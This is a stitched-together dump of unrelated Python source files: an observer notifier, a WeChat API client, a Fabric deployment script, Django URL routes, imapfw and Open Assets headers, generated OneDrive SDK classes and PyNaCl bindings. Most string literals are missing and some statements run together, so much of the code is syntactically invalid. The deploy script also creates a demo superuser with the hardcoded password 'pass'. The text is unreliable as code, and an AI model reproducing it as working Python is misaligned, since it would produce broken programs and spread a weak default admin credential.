~~ def __onUpdate ( self , resource ) : \n 
~~~ for self . __observer in self . __observers : \n 
~~~ self . __notify ( self . __observer , resource ) \n 
\n 
~~ ~~ def __notify ( self , observer , resource ) : \n 
~~~ if type ( observer ) is not callable : # FIX this \n 
~~~ urlObject = urlparse ( observer ) \n 
if urlObject . scheme == : \n 
~~~ self . __httpNotify ( observer , resource ) \n 
~~ elif urlObject . scheme == : \n 
~~~ self . __coapNotify ( observer , resource ) \n 
~~ elif urlObject . scheme == : \n 
~~~ self . __callbackNotify ( observer , resource ) \n 
~~ ~~ else : \n 
~~~ observer ( resource ) \n 
\n 
\n 
~~ ~~ def __httpNotify ( self , targetURI , resource ) : \n 
# invoke method from http client interface \n 
# self.__httpNotifyHandler(targetURI, resource) \n 
~~~ print \n 
\n 
~~ def __coapNotify ( self , targetURI , resource ) : \n 
# invoke method from CoAP server interface \n 
# self.__coapNotifyHandler(targetURI, resource) \n 
~~~ print \n 
\n 
~~ def __callbackNotify ( self , observer , resource ) : \n 
#call the function registered and pass the resource \n 
#invoke the handler through the Agent resource \n 
~~~ print \n 
\n 
# match returns the supplied URL, else none. Supplying None returns all Observers \n 
~~ def get ( self , targetURI = None ) : \n 
~~~ if targetURI != None : \n 
~~~ if targetURI in self . __observers : \n 
~~~ return targetURI \n 
~~ return None \n 
~~ return self . __observers # if no URI specified then return all observers \n 
\n 
# map the set operation to the create operation \n 
~~ def set ( self , targetURI ) : \n 
~~~ self . create ( targetURI ) \n 
\n 
# create adds an observer to the list, echoes URI if created or exists \n 
~~ def create ( self , targetURI ) : \n 
~~~ if urlparse ( targetURI ) . scheme not in self . __schemes : \n 
~~~ return None \n 
~~ if targetURI not in self . __observers : \n 
~~~ self . __observers . append ( targetURI ) # append to the list \n 
~~ return targetURI \n 
\n 
# delete removes an observer from the list, echoes None for failure \n 
~~ def delete ( self , targetURI ) : \n 
~~~ if targetURI in self . __observers : \n 
~~~ self . __observers . remove ( targetURI ) \n 
return targetURI \n 
~~ return None \n 
\n 
# -*- coding: utf-8 -*- \n 
~~ ~~ import json \n 
import time \n 
import requests \n 
\n 
from pywechat . excepts import WechatError \n 
\n 
\n 
class Basic ( object ) : \n 
\n 
~~~ """The basic class of all services.\n\n    Attributes:\n        app_id: the app id of a wechat account.\n        app_secret: the app secret of a wechat account.\n        access_token: the access token requests from the wechat.\n        token_expires_time: the time that the access token will expire.\n    """ \n 
\n 
def __init__ ( self , app_id , app_secret ) : \n 
~~~ """Initializes the service.""" \n 
self . __app_id = app_id \n 
self . __app_secret = app_secret \n 
self . __access_token = self . access_token \n 
self . __token_expires_at = None \n 
\n 
~~ @ property \n 
def access_token ( self ) : \n 
~~~ \n 
# check the access token \n 
if self . __access_token and self . __token_expires_at : \n 
~~~ if self . __token_expires_at - time . time ( ) > 60 : \n 
~~~ return self . __access_token \n 
\n 
# if access token is invaild, grant it. \n 
~~ ~~ self . _grant_access_token ( ) \n 
return self . __access_token \n 
\n 
~~ def _send_request ( self , method , url , ** kwargs ) : \n 
~~~ """Sends a request to the server.\n\n        Args:\n            method: the method of request.(\'get\', \'post\', etc)\n            url: the request\'s url.\n            kwargs: the data will send to.\n\n        Returns:\n            the json data gets from the server.\n\n        Raises:\n            WechatError: to raise the exception if it contains the error.\n        """ \n 
if not kwargs . get ( ) : \n 
~~~ kwargs [ ] = { \n 
"access_token" : self . access_token \n 
} \n 
~~ if kwargs . get ( ) : \n 
~~~ data = json . dumps ( kwargs [ ] ) . encode ( ) \n 
kwargs [ "data" ] = data \n 
\n 
~~ request = requests . request ( \n 
method = method , \n 
url = url , \n 
** kwargs \n 
) \n 
\n 
request . raise_for_status ( ) \n 
json_data = request . json ( ) \n 
self . _check_wechat_error ( json_data ) \n 
return json_data \n 
\n 
~~ @ classmethod \n 
def _check_wechat_error ( cls , json_data ) : \n 
~~~ """Check whether the data from the plaform of wechat is an error.\n\n        Args:\n            json_data: the json data gained from the wechat.\n\n        Raises:\n            WechatError: to raise the exception if it contains the error.\n        """ \n 
errcode = json_data . get ( ) \n 
if errcode and errcode != 0 : \n 
~~~ raise WechatError ( errcode , json_data . get ( ) ) \n 
\n 
~~ ~~ def _grant_access_token ( self ) : \n 
~~~ """Gets the access token from wechat.\n\n        Public account can use this method with APPID and APPSecret to gain\n        the access token.\n\n        Link:\n        https://mp.weixin.qq.com/wiki/11/0e4b294685f817b95cbed85ba5e82b8f.html\n\n        Returns:\n            the json data.Example:\n            {"access_token":"ACCESS_TOKEN","expires_in":7200}\n\n        Raises:\n            WechatError: to raise the exception if it contains the error.\n        """ \n 
\n 
# Checks whether the access token is in memcache, \n 
url = \n 
params = { \n 
"grant_type" : "client_credential" , \n 
"appid" : self . __app_id , \n 
"secret" : self . __app_secret \n 
} \n 
json_data = self . _send_request ( , url , params = params ) \n 
self . __access_token = json_data . get ( ) \n 
self . __token_expires_at = int ( \n 
time . time ( ) ) + json_data . get ( ) \n 
return json_data \n 
\n 
~~ def _get_wechat_server_ips ( self ) : \n 
~~~ """Gets the ip list from wechat.\n\n        For the reason of security, it needs the list of ip addresses of wechat\n        to limit some conditions.\n\n        Link:\n        https://mp.weixin.qq.com/wiki/0/2ad4b6bfd29f30f71d39616c2a0fcedc.html\n\n        Returns:\n            the json data.Example:\n            {\n                "ip_list":["127.0.0.1","127.0.0.1"]\n            }\n\n        Raises:\n            WechatError: to raise the exception if it contains the error.\n        """ \n 
url = "https://api.weixin.qq.com/cgi-bin/getcallbackip" \n 
params = { \n 
"access_token" : self . access_token \n 
} \n 
json_data = self . _send_request ( , url , params = params ) \n 
return json_data \n 
~~ ~~ import json \n 
from fabric . api import * \n 
from . deployer . configuration import Configuration \n 
from . deployer . helpers import mkdir , rmdir \n 
from . deployer . standard_packages import package_list \n 
import os \n 
from StringIO import StringIO \n 
\n 
\n 
site_settings = { \n 
"settings_module" : , \n 
"settings_local" : , \n 
"application_name" : , \n 
"git_location" : "https://github.com/OfferTeam/OfferListing.git" , \n 
"git_branch" : "develop" , \n 
\n 
# Defaults \n 
"static_dir" : "resources/static" , \n 
"media_dir" : "resources/media" , \n 
"requirements_file" : , \n 
} \n 
\n 
\n 
def load_configuration ( ) : \n 
\n 
~~~ with open ( os . path . join ( os . path . dirname ( os . path . abspath ( __file__ ) ) , ) , ) as f ~~~ configuration_file = . join ( f . readlines ( ) ) \n 
conf = json . JSONDecoder ( ) . decode ( configuration_file ) \n 
\n 
~~ print "Loaded server config for {}" . format ( conf [ ] ) \n 
env . hosts . append ( conf [ ] ) \n 
env . hosts_data = Configuration ( conf , site_settings ) \n 
\n 
~~ load_configuration ( ) \n 
\n 
\n 
@ task \n 
def install_requirements ( ) : \n 
~~~ sudo ( ) \n 
sudo ( ) \n 
sudo ( . format ( package_list ( ) ) ) \n 
\n 
\n 
~~ @ task \n 
def create_folders ( ) : \n 
~~~ mkdir ( env . hosts_data . base_path ( ) ) \n 
mkdir ( env . hosts_data . log_path ( ) ) \n 
\n 
\n 
~~ @ task \n 
def create_virtual_environment ( ) : \n 
~~~ with cd ( env . hosts_data . base_path ( ) ) : \n 
~~~ run ( . format ( env . hosts_data . virtualenv_path ( ) ) ) \n 
\n 
~~ with prefix ( "source {}" . format ( env . hosts_data . virtualenv_activate_path ( ) ) ) : \n 
~~~ run ( ) \n 
run ( . format ( env . hosts_data . requirements_path ( ) ) ) \n 
if env . hosts_data . is_mysql ( ) : \n 
~~~ run ( ) \n 
run ( ) \n 
\n 
\n 
~~ ~~ ~~ @ task \n 
def create_local_settings ( ) : \n 
~~~ rmdir ( env . hosts_data . local_settings_path ( ) ) \n 
put ( StringIO ( env . hosts_data . local_settings ( ) ) , env . hosts_data . local_settings_path ( ) ) \n 
\n 
\n 
~~ @ task \n 
def create_gunicorn_config ( ) : \n 
~~~ rmdir ( env . hosts_data . gunicorn_config_path ( ) ) \n 
put ( StringIO ( env . hosts_data . gunicorn_config ( ) ) , env . hosts_data . gunicorn_config_path ( ) ) \n 
sudo ( . format ( env . hosts_data . gunicorn_config_path ( ) ) ) \n 
\n 
\n 
~~ @ task \n 
def create_demo_superuser ( ) : \n 
~~~ with cd ( env . hosts_data . app_path ( ) ) : \n 
~~~ with prefix ( "source {}" . format ( env . hosts_data . virtualenv_activate_path ( ) ) ) : \n 
~~~ commands = [ \n 
"echo \\"from accounts.models import User;" , \n 
"User.objects.create_superuser(\'admin\', \'admin@example.com\', \'pass\')\\" | python manage.py shell" ] \n 
run ( . join ( commands ) ) \n 
\n 
\n 
~~ ~~ ~~ @ task \n 
def create_gunicorn_supervisor ( ) : \n 
~~~ rmdir ( env . hosts_data . gunicorn_supervisor_config_path ( ) ) \n 
put ( \n 
StringIO ( env . hosts_data . gunicorn_supervisor_config ( ) ) , \n 
env . hosts_data . gunicorn_supervisor_config_path ( ) , \n 
use_sudo = True \n 
) \n 
sudo ( ) \n 
sudo ( ) \n 
\n 
~~ @ task \n 
def create_celery_supervisor ( ) : \n 
~~~ rmdir ( env . hosts_data . celery_supervisor_config_path ( ) ) \n 
put ( \n 
StringIO ( env . hosts_data . celery_supervisor_config ( ) ) , \n 
env . hosts_data . celery_supervisor_config_path ( ) , \n 
use_sudo = True \n 
) \n 
sudo ( ) \n 
sudo ( ) \n 
\n 
\n 
~~ @ task \n 
def create_nginx_config ( ) : \n 
~~~ put ( StringIO ( env . hosts_data . nginx_config ( ) ) , env . hosts_data . nginx_available_path ( ) , use_sudo = True sudo ( . format ( env . hosts_data . nginx_available_path ( ) , env . hosts_data . nginx_enabled_path sudo ( ) \n 
\n 
\n 
~~ @ task \n 
def delete_nginx_config ( ) : \n 
~~~ rmdir ( env . hosts_data . nginx_enabled_path ( ) , sudo_access = True ) \n 
rmdir ( env . hosts_data . nginx_available_path ( ) , sudo_access = True ) \n 
sudo ( ) \n 
\n 
\n 
~~ @ task \n 
def migrate_database ( ) : \n 
~~~ with cd ( env . hosts_data . app_path ( ) ) : \n 
~~~ with prefix ( "source {}" . format ( env . hosts_data . virtualenv_activate_path ( ) ) ) : \n 
~~~ run ( "python manage.py syncdb --noinput" ) \n 
run ( "python manage.py migrate --noinput" ) \n 
\n 
~~ ~~ ~~ @ task \n 
def collect_static ( ) : \n 
~~~ with cd ( env . hosts_data . app_path ( ) ) : \n 
~~~ with prefix ( "source {}" . format ( env . hosts_data . virtualenv_activate_path ( ) ) ) : \n 
~~~ run ( "python manage.py collectstatic --noinput" ) \n 
\n 
\n 
~~ ~~ ~~ @ task \n 
def delete_folders ( ) : \n 
~~~ rmdir ( env . hosts_data . base_path ( ) ) \n 
\n 
\n 
~~ @ task \n 
def delete_gunicorn_supervisor ( ) : \n 
~~~ server_stop ( ) \n 
rmdir ( env . hosts_data . gunicorn_supervisor_config_path ( ) , sudo_access = True ) \n 
sudo ( ) \n 
sudo ( ) \n 
\n 
~~ @ task \n 
def delete_celery_supervisor ( ) : \n 
~~~ server_stop ( ) \n 
rmdir ( env . hosts_data . celery_supervisor_config_path ( ) , sudo_access = True ) \n 
sudo ( ) \n 
sudo ( ) \n 
\n 
\n 
~~ @ task ( default = True ) \n 
def make_deploy ( ) : \n 
# Install all the packages \n 
~~~ install_requirements ( ) \n 
\n 
# Create the folders for the site \n 
create_folders ( ) \n 
\n 
# Create the git \n 
run ( env . hosts_data . git_clone_command ( ) ) \n 
with cd ( env . hosts_data . app_path ( ) ) : \n 
~~~ run ( env . hosts_data . git_checkout_command ( ) ) \n 
\n 
# Create the virtual environment \n 
~~ create_virtual_environment ( ) \n 
\n 
# Upload the local settings \n 
create_local_settings ( ) \n 
\n 
# Create database \n 
migrate_database ( ) \n 
create_demo_superuser ( ) \n 
\n 
# Collect the static files \n 
collect_static ( ) \n 
\n 
# Create the gunicorn environment \n 
create_gunicorn_config ( ) \n 
create_gunicorn_supervisor ( ) \n 
\n 
# Create celery \n 
create_celery_supervisor ( ) \n 
\n 
# Create nginx configs \n 
create_nginx_config ( ) \n 
\n 
\n 
~~ @ task \n 
def server_status ( ) : \n 
~~~ sudo ( . format ( env . hosts_data . application_name ( ) ) ) \n 
\n 
\n 
~~ @ task \n 
def server_stop ( ) : \n 
~~~ sudo ( . format ( env . hosts_data . application_name ( ) ) ) \n 
sudo ( . format ( env . hosts_data . application_name ( ) ) ) \n 
\n 
\n 
~~ @ task \n 
def server_start ( ) : \n 
~~~ sudo ( . format ( env . hosts_data . application_name ( ) ) ) \n 
sudo ( . format ( env . hosts_data . application_name ( ) ) ) \n 
\n 
\n 
~~ @ task \n 
def server_restart ( ) : \n 
~~~ sudo ( . format ( env . hosts_data . application_name ( ) ) ) \n 
sudo ( . format ( env . hosts_data . application_name ( ) ) ) \n 
\n 
\n 
~~ @ task \n 
def destroy_deploy ( ) : \n 
~~~ delete_folders ( ) \n 
delete_gunicorn_supervisor ( ) \n 
delete_celery_supervisor ( ) \n 
delete_nginx_config ( ) \n 
\n 
\n 
~~ @ task \n 
def update_deploy ( ) : \n 
~~~ server_stop ( ) \n 
with cd ( env . hosts_data . app_path ( ) ) : \n 
~~~ with prefix ( "source {}" . format ( env . hosts_data . virtualenv_activate_path ( ) ) ) : \n 
~~~ run ( ) \n 
run ( . format ( env . hosts_data . requirements_path ( ) ) ) \n 
~~ ~~ migrate_database ( ) \n 
collect_static ( ) \n 
server_start ( ) \n 
~~ from django . conf . urls import patterns , url , include \n 
from haystack . views import search_view_factory , SearchView \n 
from offers . feeds import OfferFeed , OfferAtomFeed \n 
from offers . forms import OfferSearchForm \n 
from . import views as offer_views \n 
\n 
\n 
urlpatterns = patterns ( , \n 
url ( , , name = ) , \n 
url ( , , name = ) , \n 
url ( , , name = "like" ) , \n 
\n 
url ( , search_view_factory ( \n 
view_class = SearchView , \n 
form_class = OfferSearchForm , \n 
template = , \n 
results_per_page = 8 , \n 
) , \n 
name = , \n 
) , \n 
\n 
url ( , OfferFeed ( ) , name = ) , \n 
url ( , OfferAtomFeed ( ) , name = ) , \n 
\n 
url ( , , name = "admin_home" ) , \n 
\n 
url ( , , name = "admin_requests" ) , \n 
url ( , , name = "admin_request_new" ) , \n 
url ( , , name = "admin_request_edit" ) , \n 
url ( , , name = "admin_request_delete" url ( , , name = "admin_request_mark" url ( , , name = "admin_request_preview" \n 
url ( , , name = "admin_offers" ) , \n 
url ( , , name = "admin_offer" ) , \n 
url ( , , name = "admin_offer_mark" url ( \n 
, \n 
, \n 
name = "admin_offer_plan_mark" \n 
) , \n 
url ( , , name = "admin_offer_update" \n 
url ( , , name = "admin_locations" ) , \n 
url ( , , name = "admin_location_edit" url ( , , name = "admin_location_new" ) , \n 
\n 
) \n 
# The MIT License (MIT). \n 
# Copyright (C) 2015-2016, Nicolas Sebrecht and contributors. \n 
\n 
\n 
__productname__ = \n 
__version__ = "0.025" \n 
__copyright__ = "Copyright 2015-2016 Nicolas Sebrecht & contributors" \n 
__author__ = "Nicolas Sebrecht" \n 
__author_email__ = "nicolas.s-dev@laposte.net" \n 
__description__ = "Framework for working with IMAP and emails" \n 
__license__ = "The MIT License (MIT)" \n 
__homepage__ = "http://github.com/OfflineIMAP/imapfw" \n 
\n 
\n 
from imapfw . init import Imapfw # Avoid circular dependencies. \n 
from imapfw import runtime # Import this module ASAP. \n 
# The MIT License (MIT) \n 
# \n 
# Copyright (c) 2015, Nicolas Sebrecht & contributors \n 
# \n 
# Permission is hereby granted, free of charge, to any person obtaining a copy \n 
# of this software and associated documentation files (the "Software"), to deal \n 
# in the Software without restriction, including without limitation the rights \n 
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell \n 
# copies of the Software, and to permit persons to whom the Software is \n 
# furnished to do so, subject to the following conditions: \n 
# \n 
# The above copyright notice and this permission notice shall be included in \n 
# all copies or substantial portions of the Software. \n 
# \n 
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR \n 
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, \n 
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE \n 
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER \n 
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, \n 
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN \n 
# THE SOFTWARE. \n 
\n 
from imapfw import runtime \n 
\n 
from . manager import Manager \n 
\n 
\n 
class FolderManager ( Manager ) : \n 
~~~ def __init__ ( self ) : \n 
~~~ super ( FolderManager , self ) . __init__ ( ) \n 
\n 
self . rascal = runtime . rascal \n 
# -*- coding: utf-8 -*-  \n 
~~ ~~ \'\'\'\n# Copyright (c) 2015 Microsoft Corporation\n# \n# Permission is hereby granted, free of charge, to any person obtaining a copy\n# of this software and associated documentation files (the "Software"), to deal\n# in the Software without restriction, including without limitation the rights\n# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n# copies of the Software, and to permit persons to whom the Software is\n# furnished to do so, subject to the following conditions:\n# \n# The above copyright notice and this permission notice shall be included in\n# all copies or substantial portions of the Software.\n# \n# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n# THE SOFTWARE.\n# \n#  This file was generated and any changes will be overwritten.\n\'\'\' \n 
\n 
from __future__ import unicode_literals \n 
from . . model . hashes import Hashes \n 
from . . one_drive_object_base import OneDriveObjectBase \n 
\n 
\n 
class File ( OneDriveObjectBase ) : \n 
\n 
~~~ def __init__ ( self , prop_dict = { } ) : \n 
~~~ self . _prop_dict = prop_dict \n 
\n 
~~ @ property \n 
def hashes ( self ) : \n 
~~~ """\n        Gets and sets the hashes\n        \n        Returns: \n            :class:`Hashes<onedrivesdk.model.hashes.Hashes>`:\n                The hashes\n        """ \n 
if "hashes" in self . _prop_dict : \n 
~~~ if isinstance ( self . _prop_dict [ "hashes" ] , OneDriveObjectBase ) : \n 
~~~ return self . _prop_dict [ "hashes" ] \n 
~~ else : \n 
~~~ self . _prop_dict [ "hashes" ] = Hashes ( self . _prop_dict [ "hashes" ] ) \n 
return self . _prop_dict [ "hashes" ] \n 
\n 
~~ ~~ return None \n 
\n 
~~ @ hashes . setter \n 
def hashes ( self , val ) : \n 
~~~ self . _prop_dict [ "hashes" ] = val \n 
~~ @ property \n 
def mime_type ( self ) : \n 
~~~ """Gets and sets the mimeType\n        \n        Returns: \n            str:\n                The mimeType\n        """ \n 
if "mimeType" in self . _prop_dict : \n 
~~~ return self . _prop_dict [ "mimeType" ] \n 
~~ else : \n 
~~~ return None \n 
\n 
~~ ~~ @ mime_type . setter \n 
def mime_type ( self , val ) : \n 
~~~ self . _prop_dict [ "mimeType" ] = val \n 
\n 
~~ ~~ \'\'\'\n------------------------------------------------------------------------------\n Copyright (c) 2015 Microsoft Corporation\n\n Permission is hereby granted, free of charge, to any person obtaining a copy\n of this software and associated documentation files (the "Software"), to deal\n in the Software without restriction, including without limitation the rights\n to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n copies of the Software, and to permit persons to whom the Software is\n furnished to do so, subject to the following conditions:\n\n The above copyright notice and this permission notice shall be included in\n all copies or substantial portions of the Software.\n\n THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n THE SOFTWARE.\n------------------------------------------------------------------------------\n\'\'\' \n 
\n 
\n 
class RequestBuilderBase ( object ) : \n 
\n 
~~~ def __init__ ( self , request_url , client ) : \n 
~~~ """Initialize a request builder which returns a request\n        when request() is called\n\n        Args:\n            request_url (str): The URL to construct the request\n                for\n            client (:class:`OneDriveClient<onedrivesdk.requests.one_drive_client.OneDriveClient>`):\n                The client with which the request will be made\n        """ \n 
self . _request_url = request_url \n 
self . _client = client \n 
\n 
~~ def append_to_request_url ( self , url_segment ) : \n 
~~~ """Appends a URL portion to the current request URL\n\n        Args:\n            url_segment (str): The segment you would like to append\n                to the existing request URL.\n        """ \n 
return self . _request_url + "/" + url_segment \n 
# -*- coding: utf-8 -*-  \n 
~~ ~~ \'\'\'\n# Copyright (c) 2015 Microsoft Corporation\n# \n# Permission is hereby granted, free of charge, to any person obtaining a copy\n# of this software and associated documentation files (the "Software"), to deal\n# in the Software without restriction, including without limitation the rights\n# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n# copies of the Software, and to permit persons to whom the Software is\n# furnished to do so, subject to the following conditions:\n# \n# The above copyright notice and this permission notice shall be included in\n# all copies or substantial portions of the Software.\n# \n# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n# THE SOFTWARE.\n# \n#  This file was generated and any changes will be overwritten.\n\'\'\' \n 
\n 
from __future__ import unicode_literals \n 
from . . collection_base import CollectionRequestBase , CollectionResponseBase , CollectionPageBase \n 
from . . request_builder_base import RequestBuilderBase \n 
from . . model . item import Item \n 
import json \n 
\n 
class SharedCollectionRequest ( CollectionRequestBase ) : \n 
\n 
~~~ def __init__ ( self , request_url , client , options ) : \n 
~~~ """Initialize the SharedCollectionRequest\n        \n        Args:\n            request_url (str): The url to perform the SharedCollectionRequest\n                on\n            client (:class:`OneDriveClient<onedrivesdk.request.one_drive_client.OneDriveClient>`):\n                The client which will be used for the request\n            options (list of :class:`Option<onedrivesdk.options.Option>`):\n                A list of options to pass into the request\n        """ \n 
super ( SharedCollectionRequest , self ) . __init__ ( request_url , client , options ) \n 
\n 
~~ def get ( self ) : \n 
~~~ """Gets the SharedCollectionPage\n\n        Returns: \n            :class:`SharedCollectionPage<onedrivesdk.request.shared_collection.SharedCollectionPage>`:\n                The SharedCollectionPage\n        """ \n 
self . method = "GET" \n 
collection_response = SharedCollectionResponse ( json . loads ( self . send ( ) . content ) ) \n 
return self . _page_from_response ( collection_response ) \n 
\n 
\n 
~~ ~~ class SharedCollectionRequestBuilder ( RequestBuilderBase ) : \n 
\n 
~~~ def __getitem__ ( self , key ) : \n 
~~~ """Get the ItemRequestBuilder with the specified key\n        \n        Args:\n            key (str): The key to get a ItemRequestBuilder for\n        \n        Returns: \n            :class:`ItemRequestBuilder<onedrivesdk.request.item_request_builder.ItemRequestBuilder>`:\n                A ItemRequestBuilder for that key\n        """ \n 
return ItemRequestBuilder ( self . append_to_request_url ( str ( key ) ) , self . _client ) \n 
\n 
~~ def request ( self , expand = None , select = None , top = None , order_by = None , options = None ) : \n 
~~~ """Builds the SharedCollectionRequest\n        \n        Args:\n            expand (str): Default None, comma-seperated list of relationships\n                to expand in the response.\n            select (str): Default None, comma-seperated list of properties to\n                include in the response.\n            top (int): Default None, the number of items to return in a result.\n            order_by (str): Default None, comma-seperated list of properties\n                that are used to sort the order of items in the response.\n            options (list of :class:`Option<onedrivesdk.options.Option>`):\n                A list of options to pass into the request. Defaults to None.\n\n        Returns:\n            :class:`SharedCollectionRequest<onedrivesdk.request.shared_collection.SharedCollectionRequest>`:\n                The SharedCollectionRequest\n        """ \n 
req = SharedCollectionRequest ( self . _request_url , self . _client , options ) \n 
req . _set_query_options ( expand = expand , select = select , top = top , order_by = order_by ) \n 
return req \n 
\n 
~~ def get ( self ) : \n 
~~~ """Gets the SharedCollectionPage\n\n        Returns: \n            :class:`SharedCollectionPage<onedrivesdk.request.shared_collection.SharedCollectionPage>`:\n                The SharedCollectionPage\n        """ \n 
return self . request ( ) . get ( ) \n 
\n 
\n 
\n 
~~ ~~ class SharedCollectionResponse ( CollectionResponseBase ) : \n 
\n 
~~~ @ property \n 
def collection_page ( self ) : \n 
~~~ """The collection page stored in the response JSON\n        \n        Returns:\n            :class:`SharedCollectionPage<onedrivesdk.request.shared_collection.SharedCollectionPage>`:\n                The collection page\n        """ \n 
if self . _collection_page : \n 
~~~ self . _collection_page . _prop_list = self . _prop_dict [ "value" ] \n 
~~ else : \n 
~~~ self . _collection_page = SharedCollectionPage ( self . _prop_dict [ "value" ] ) \n 
\n 
~~ return self . _collection_page \n 
\n 
\n 
~~ ~~ class SharedCollectionPage ( CollectionPageBase ) : \n 
\n 
~~~ def __getitem__ ( self , index ) : \n 
~~~ """Get the Item at the index specified\n        \n        Args:\n            index (int): The index of the item to get from the SharedCollectionPage\n\n        Returns:\n            :class:`Item<onedrivesdk.model.item.Item>`:\n                The Item at the index\n        """ \n 
return Item ( self . _prop_list [ index ] ) \n 
\n 
~~ def shared ( self ) : \n 
~~~ """Get a generator of Item within the SharedCollectionPage\n        \n        Yields:\n            :class:`Item<onedrivesdk.model.item.Item>`:\n                The next Item in the collection\n        """ \n 
for item in self . _prop_list : \n 
~~~ yield Item ( item ) \n 
\n 
~~ ~~ def _init_next_page_request ( self , next_page_link , client , options ) : \n 
~~~ """Initialize the next page request for the SharedCollectionPage\n        \n        Args:\n            next_page_link (str): The URL for the next page request\n                to be sent to\n            client (:class:`OneDriveClient<onedrivesdk.model.one_drive_client.OneDriveClient>`:\n                The client to be used for the request\n            options (list of :class:`Option<onedrivesdk.options.Option>`:\n                A list of options\n        """ \n 
self . _next_page_request = SharedCollectionRequest ( next_page_link , client , options ) \n 
\n 
\n 
~~ ~~ from . . request . item_request_builder import ItemRequestBuilder \n 
# -*- coding: utf-8; -*- \n 
# \n 
# The MIT License (MIT) \n 
# \n 
# Copyright (c) 2014 Flavien Charlon \n 
# \n 
# Permission is hereby granted, free of charge, to any person obtaining a copy \n 
# of this software and associated documentation files (the "Software"), to deal \n 
# in the Software without restriction, including without limitation the rights \n 
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell \n 
# copies of the Software, and to permit persons to whom the Software is \n 
# furnished to do so, subject to the following conditions: \n 
# \n 
# The above copyright notice and this permission notice shall be included in all \n 
# copies or substantial portions of the Software. \n 
# \n 
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR \n 
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, \n 
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE \n 
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER \n 
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, \n 
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE \n 
# SOFTWARE. \n 
\n 
"""\nReference implementation of the Open Assets Protocol.\n""" \n 
\n 
__version__ = # Copyright 2013 Donald Stufft and individual contributors \n 
# \n 
# Licensed under the Apache License, Version 2.0 (the "License"); \n 
# you may not use this file except in compliance with the License. \n 
# You may obtain a copy of the License at \n 
# \n 
# http://www.apache.org/licenses/LICENSE-2.0 \n 
# \n 
# Unless required by applicable law or agreed to in writing, software \n 
# distributed under the License is distributed on an "AS IS" BASIS, \n 
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. \n 
# See the License for the specific language governing permissions and \n 
# limitations under the License. \n 
from __future__ import absolute_import , division , print_function \n 
\n 
import glob \n 
import os . path \n 
\n 
from cffi import FFI \n 
from cffi . verifier import Verifier \n 
\n 
\n 
__all__ = [ "ffi" ] \n 
\n 
\n 
HEADERS = glob . glob ( \n 
os . path . join ( os . path . abspath ( os . path . dirname ( __file__ ) ) , "*.h" ) \n 
) \n 
\n 
\n 
# Build our FFI instance \n 
ffi = FFI ( ) \n 
\n 
\n 
# Add all of our header files, but sort first for consistency of the \n 
# hash that CFFI generates and uses in the .so filename (the order of \n 
# glob() results cannot be relied on) \n 
for header in sorted ( HEADERS ) : \n 
~~~ with open ( header , "r" ) as hfile : \n 
~~~ ffi . cdef ( hfile . read ( ) ) \n 
\n 
\n 
# TODO: Can we use the ABI of libsodium for this instead? \n 
~~ ~~ ffi . verifier = Verifier ( \n 
ffi , \n 
\n 
"#include <sodium.h>" , \n 
\n 
# We need to link to the sodium library \n 
libraries = [ "sodium" ] , \n 
\n 
# Our ext_package is nacl so look for it \n 
ext_package = "nacl._lib" , \n 
) \n 
\n 
\n 
class Library ( object ) : \n 
\n 
~~~ def __init__ ( self , ffi ) : \n 
~~~ self . ffi = ffi \n 
